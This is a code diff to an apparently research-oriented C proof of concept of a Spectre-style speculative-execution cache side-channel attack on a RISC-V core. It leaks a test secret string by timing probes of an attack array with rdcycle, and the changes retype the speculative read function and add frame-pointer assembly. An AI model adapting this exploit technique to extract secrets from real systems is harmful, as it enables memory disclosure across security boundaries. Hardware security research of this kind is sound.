@@ -4,11 +4,11 @@
 #include "encoding.h"
 
 #define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
-#define SECRET_SZ 26
+#define SECRET_SZ 31
 #define CACHE_HIT_THRESHOLD 50
 
 uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
-char* secretString = "!\"#ThisIsTheBabyBoomerTest";
+char* secretString = "!\"#ThisIsTheBabySonicBoomerTest";
 
 /**
  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
@@ -43,14 +43,13 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
  *
  * @input addr passed in address to read from
  */
-void specFunc(uint64_t addr){
-    //printf("started specFunc\n");
+void specFunc(char *addr){
     extern void frameDump();
     uint64_t dummy = 0;
     frameDump();
-    dummy = attackArray[(*((uint8_t*)addr)) * L1_BLOCK_SZ_BYTES]; 
+    char secret = *addr;
+    dummy = attackArray[secret * L1_BLOCK_SZ_BYTES]; 
     dummy = rdcycle();
-    //printf("finished specFunc\n");
 }
 
 int main(void){
@@ -76,7 +75,8 @@ int main(void){
             //printf("flushed attackarray\n");
 
             // run the particular attack sequence
-            specFunc((uint64_t)secretString + offset);
+            specFunc(secretString + offset);
+            __asm__ volatile ("ld fp, -16(sp)");//Adjust the frame pointer for properly looping over the offset
 
             // read out array 2 and see the hit secret value
             // this is also assuming there is no prefetching
@@ -98,6 +98,6 @@ int main(void){
         uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
 
-        printf("m[0x%p] =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(secretString + offset), hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
+	printf("m[0x%p] = offset(%lu) = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(secretString + offset), offset, secretString[offset], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]);
     }
 }
